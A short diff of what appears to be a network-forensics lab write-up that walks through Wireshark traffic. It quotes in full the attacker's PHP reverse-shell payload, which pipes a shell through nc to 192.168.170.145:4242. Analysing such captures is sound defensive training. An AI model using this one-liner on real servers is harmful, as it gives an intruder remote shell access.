@@ -17,7 +17,7 @@ To view uploaded data we use thefollowing filter in wireshark **http.request.met
 <img width="953" height="354" alt="task 1 1" src="https://github.com/user-attachments/assets/45184ebb-c109-4842-8c23-8c8ad532ed17" /> <br>
 _URL used to upload the reverse the shell_
 
-Question: What payload did the attacker use to gain access? 
+Question: What payload did the attacker use to gain access? <br>
 Answer: **<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh-i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>** <br>
 
 <img width="709" height="177" alt="task 1 2" src="https://github.com/user-attachments/assets/f30ba1dd-6a7c-478c-8c1d-37bf8a35a7d1" /> <br>
